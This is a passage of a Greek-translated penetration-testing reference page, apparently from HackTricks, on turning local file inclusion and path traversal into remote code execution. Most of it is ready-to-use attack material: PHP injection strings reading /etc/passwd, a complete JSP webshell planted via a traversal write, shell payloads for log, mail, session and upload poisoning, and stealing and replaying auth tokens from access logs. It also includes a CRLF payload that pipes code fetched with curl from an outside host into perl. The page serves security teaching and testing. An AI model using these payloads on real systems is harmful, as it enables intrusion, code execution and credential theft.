Ενώ αυτό στοχεύει στο να σταματήσει το traversal, δημιουργεί άθελά του ένα διάνυσμα για code injection. Για να το εκμεταλλευτεί για την ανάγνωση των περιεχομένων αρχείων, ένας επιτιθέμενος θα μπορούσε να χρησιμοποιήσει:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Ομοίως, για εκτέλεση αυθαίρετων εντολών συστήματος, κάποιος θα μπορούσε να χρησιμοποιήσει:
```plaintext
' and die(system("id")) or '
```
Είναι σημαντικό να **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Αυτή η τεχνική αφορά περιπτώσεις όπου **ελέγχετε** τη **διαδρομή αρχείου** μιας **PHP function** που θα **προσπελάσει ένα αρχείο** αλλά δεν θα δείτε το περιεχόμενο του αρχείου (όπως μια απλή κλήση σε **`file()`**) και το περιεχόμενο δεν εμφανίζεται.

Στο [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) εξηγείται πώς ένας blind path traversal μπορεί να εκμεταλλευτεί μέσω PHP filter για να εξάγει το περιεχόμενο ενός αρχείου μέσω ενός error oracle.

Συνοπτικά, η τεχνική χρησιμοποιεί την κωδικοποίηση **"UCS-4LE"** για να κάνει το περιεχόμενο ενός αρχείου τόσο **μεγάλο** που η **PHP function** που ανοίγει το αρχείο θα προκαλέσει ένα **σφάλμα**.

Στη συνέχεια, για να leak τον πρώτο χαρακτήρα χρησιμοποιείται το φίλτρο `dechunk` μαζί με άλλα όπως `base64` ή `rot13` και τελικά χρησιμοποιούνται τα φίλτρα `convert.iconv.UCS-4.UCS-4LE` και `convert.iconv.UTF16.UTF-16BE` για να τοποθετήσουν άλλους χαρακτήρες στην αρχή και να τους leak.

**Συναρτήσεις που μπορεί να είναι ευάλωτες**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Για τεχνικές λεπτομέρειες δείτε την προαναφερθείσα ανάρτηση!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Τυπική ροή εκμετάλλευσης:
- Εντοπίστε ένα write primitive σε ένα endpoint ή background worker που δέχεται path/filename και γράφει περιεχόμενο στο δίσκο (π.χ., message-driven ingestion, XML/JSON command handlers, ZIP extractors, κ.λπ.).
- Προσδιορίστε web-exposed directories. Κοινά παραδείγματα:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Συναρμολογήστε μια traversal path που βγαίνει έξω από τον προοριζόμενο storage directory προς το webroot, και συμπεριλάβετε το webshell content σας.
- Περιηγηθείτε στο dropped payload και εκτελέστε εντολές.

Σημειώσεις:
- Η ευάλωτη υπηρεσία που εκτελεί τη γραφή μπορεί να ακούει σε μη-HTTP port (π.χ., ένας JMF XML listener σε TCP 4004). Το κύριο web portal (σε διαφορετική port) θα σερβίρει αργότερα το payload σας.
- Σε Java stacks, αυτές οι εγγραφές αρχείων συχνά υλοποιούνται με απλή concatenation `File`/`Paths`. Η έλλειψη canonicalisation/allow-listing είναι το βασικό σφάλμα.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Σκληροποίηση που εξουδετερώνει αυτή την κατηγορία σφαλμάτων:
- Επιλύστε σε canonical path και επιβάλετε ότι είναι απόγονος ενός allow-listed base directory.
- Απορρίψτε οποιαδήποτε διαδρομή που περιέχει `..`, absolute roots, ή drive letters· προτιμήστε generated filenames.
- Εκτελέστε τον writer ως λογαριασμό με χαμηλά προνόμια και διαχωρίστε τους write directories από τα served roots.

## Remote File Inclusion

Εξηγήθηκε προηγουμένως, [**follow this link**](#remote-file-inclusion).

### Μέσω αρχείου καταγραφής Apache/Nginx

Εάν ο Apache ή ο Nginx server είναι **vulnerable to LFI** μέσα στη λειτουργία include, μπορείτε να προσπαθήσετε να αποκτήσετε πρόσβαση στα **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, να τοποθετήσετε μέσα στο **user agent** ή σε ένα **GET parameter** ένα php shell όπως **`<?php system($_GET['c']); ?>`** και να συμπεριλάβετε αυτό το αρχείο

> [!WARNING]
> Σημειώστε ότι **αν χρησιμοποιήσετε double quotes** για το shell αντί για **simple quotes**, τα double quotes θα τροποποιηθούν για τη συμβολοσειρά "_**quote;**_", **PHP θα ρίξει σφάλμα** εκεί και **τίποτα άλλο δεν θα εκτελεστεί**.
>
> Επίσης, βεβαιωθείτε ότι **γράφετε σωστά το payload** αλλιώς η PHP θα κάνει error κάθε φορά που προσπαθεί να φορτώσει το log file και δεν θα έχετε δεύτερη ευκαιρία.

Αυτό μπορεί επίσης να γίνει σε άλλα logs αλλά **προσοχή,** ο κώδικας μέσα στα logs μπορεί να είναι URL encoded και αυτό μπορεί να καταστρέψει το Shell. Η κεφαλίδα **authorisation "basic"** περιέχει "user:password" σε Base64 και αποκωδικοποιείται μέσα στα logs. Η PHPShell μπορεί να εισαχθεί μέσα σε αυτή την κεφαλίδα.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Διαβάστε τα access logs για να συλλέξετε GET-based auth tokens (token replay)

Πολλές εφαρμογές αποδέχονται κατά λάθος session/auth tokens μέσω GET (π.χ., AuthenticationToken, token, sid). Αν έχετε έναν path traversal/LFI primitive προς τα web server access logs, μπορείτε να κλέψετε αυτά τα tokens από τα access logs και να τα replay για να παρακάμψετε πλήρως την authentication.

How-to:
- Χρησιμοποιήστε το traversal/LFI για να διαβάσετε το web server access log. Συνηθισμένες τοποθεσίες:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Κάποια endpoints επιστρέφουν file reads Base64-encoded. Αν συμβαίνει αυτό, αποκωδικοποιήστε το τοπικά και ελέγξτε τις γραμμές του log.
- Χρησιμοποιήστε Grep για GET requests που περιλαμβάνουν μια παράμετρο token και αποσπάστε την τιμή της, στη συνέχεια replay-άρετε την στο application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Αποκωδικοποίησε το σώμα αν είναι Base64, μετά αναπαρήγαγε ένα καταγεγραμμένο token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Σημειώσεις:
- Tokens σε URLs καταγράφονται από προεπιλογή· μην αποδέχεστε ποτέ bearer tokens μέσω GET σε production συστήματα.
- Εάν η εφαρμογή υποστηρίζει πολλαπλά ονόματα token, αναζητήστε κοινά κλειδιά όπως AuthenticationToken, token, sid, access_token.
- Ανανεώστε οποιαδήποτε tokens που μπορεί να έχουν leaked στα logs.

### Μέσω Email

**Στείλτε ένα mail** σε έναν εσωτερικό λογαριασμό (user@localhost) που περιέχει το PHP payload σας όπως `<?php echo system($_REQUEST["cmd"]); ?>` και δοκιμάστε να το include στο mail του χρήστη με ένα path σαν **`/var/mail/<USERNAME>`** ή **`/var/spool/mail/<USERNAME>`**

### Μέσω /proc/*/fd/*

1. Ανεβάστε πολλά shells (για παράδειγμα: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), με $PID = PID της διεργασίας (μπορεί να brute forced) και $FD ο file descriptor (μπορεί επίσης να brute forced)

### Μέσω /proc/self/environ

Όπως ένα log αρχείο, στείλτε το payload στο User-Agent — θα αντανακλαστεί μέσα στο αρχείο /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Μέσω upload

Εάν μπορείτε να κάνετε upload ένα αρχείο, απλά inject το shell payload μέσα σε αυτό (π.χ : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Για να παραμείνει το αρχείο ευανάγνωστο, είναι καλύτερο να εισάγετε δεδομένα στα μεταδεδομένα των εικόνων/doc/pdf

### Μέσω μεταφόρτωσης αρχείου ZIP

Μεταφορτώστε ένα ZIP αρχείο που περιέχει ένα συμπιεσμένο PHP shell και αποκτήστε πρόσβαση:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Μέσω PHP sessions

Ελέγξτε αν ο ιστότοπος χρησιμοποιεί PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Στο PHP αυτές οι sessions αποθηκεύονται σε αρχεία _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Θέστε το cookie σε `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Χρησιμοποιήστε το LFI για να συμπεριλάβετε το αρχείο συνεδρίας του PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Μέσω ssh

Αν το ssh είναι ενεργό έλεγξε ποιος χρήστης χρησιμοποιείται (/proc/self/status & /etc/passwd) και προσπάθησε να αποκτήσεις πρόσβαση στο **\<HOME>/.ssh/id_rsa**

### **Μέσω** **vsftpd** _**αρχεία καταγραφής**_

Τα αρχεία καταγραφής για τον FTP server vsftpd βρίσκονται στο _**/var/log/vsftpd.log**_. Στην περίπτωση όπου υπάρχει ευπάθεια Local File Inclusion (LFI) και είναι δυνατή η πρόσβαση σε έναν εκτεθειμένο vsftpd server, μπορούν να εξεταστούν τα παρακάτω βήματα:

1. Εισάγετε ένα PHP payload στο πεδίο username κατά τη διαδικασία σύνδεσης.
2. Μετά την έγχυση, χρησιμοποιήστε το LFI για να ανακτήσετε τα αρχεία καταγραφής του server από _**/var/log/vsftpd.log**_.

### Μέσω php base64 filter (χρήση base64)

Όπως φαίνεται σε [αυτό το](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) άρθρο, το PHP base64 filter απλώς αγνοεί χαρακτήρες που δεν είναι base64. Μπορείτε να το χρησιμοποιήσετε για να παρακάμψετε τον έλεγχο της κατάληξης αρχείου: αν παρέχετε base64 που τελειώνει με ".php", τότε θα αγνοηθεί το "." και το "php" θα προσαρτηθεί στο base64. Εδώ ένα παράδειγμα payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Μέσω php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) εξηγεί ότι μπορείτε να χρησιμοποιήσετε **php filters to generate arbitrary content** ως έξοδο. Το οποίο ουσιαστικά σημαίνει ότι μπορείτε να **generate arbitrary php code** για το include **χωρίς να χρειάζεται να το γράψετε** σε αρχείο.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Μέσω segmentation fault

**Upload** ένα αρχείο που θα αποθηκευτεί ως **temporary** στο `/tmp`, στη συνέχεια στην **same request,** προκαλέστε ένα **segmentation fault**, και τότε το **temporary file won't be deleted** και μπορείτε να το αναζητήσετε.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Μέσω Nginx temp file storage

If you found a **Local File Inclusion** and **Nginx** is running in front of PHP you might be able to obtain RCE with the following technique:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Μέσω PHP_SESSION_UPLOAD_PROGRESS

If you found a **Local File Inclusion** even if you **don't have a session** and `session.auto_start` is `Off`. If you provide the **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data, PHP will **enable the session for you**. You could abuse this to get RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Μέσω temp file uploads in Windows

If you found a **Local File Inclusion** and and the server is running in **Windows** you might get RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Μέσω `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Το παρακάτω εκμεταλλεύεται ένα CRLF vuln για να αποκτήσει RCE (από [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Μέσω phpinfo() (file_uploads = on)

If you found a **Local File Inclusion** and a file exposing **phpinfo()** with file_uploads = on you can get RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Μέσω compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

If you found a **Local File Inclusion** and you **can exfiltrate the path** of the temp file BUT the **server** is **checking** if the **file to be included has PHP marks**, you can try to **bypass that check** with this **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Μέσω eternal waiting + bruteforce

If you can abuse the LFI to **upload temporary files** and make the server **hang** the PHP execution, you could then **brute force filenames during hours** to find the temporary file:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Σε Fatal Error

If you include any of the files `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (You need to include the same one 2 time to throw that error).

**Δεν ξέρω πόσο χρήσιμο είναι αυτό αλλά μπορεί να είναι.**\
_Ακόμα κι αν προκαλέσετε PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


### Preserve traversal sequences from the client

Some HTTP clients normalize or collapse `../` before the request reaches the server, breaking directory traversal payloads. Use `curl --path-as-is` to keep traversal untouched when abusing log/download endpoints that concatenate a user-controlled filename, and add `--ignore-content-length` for pseudo-files like `/proc`:
```bash
curl --path-as-is -b "session=$SESSION" \
"http://TARGET/admin/get_system_log?log_identifier=../../../../proc/self/environ" \
--ignore-content-length -s | tr '\000' '\n'
```
Ρύθμισε τον αριθμό των τμημάτων `../` μέχρι να διαφύγεις από τον προοριζόμενο κατάλογο, και στη συνέχεια dump `/etc/passwd`, `/proc/self/cwd/app.py`, ή άλλα αρχεία πηγαίου κώδικα/διαμόρφωσης.

## Αναφορές

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [HTB: Imagery (admin log download traversal + `/proc/self/environ` read)](https://0xdf.gitlab.io/2026/01/24/htb-imagery.html)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
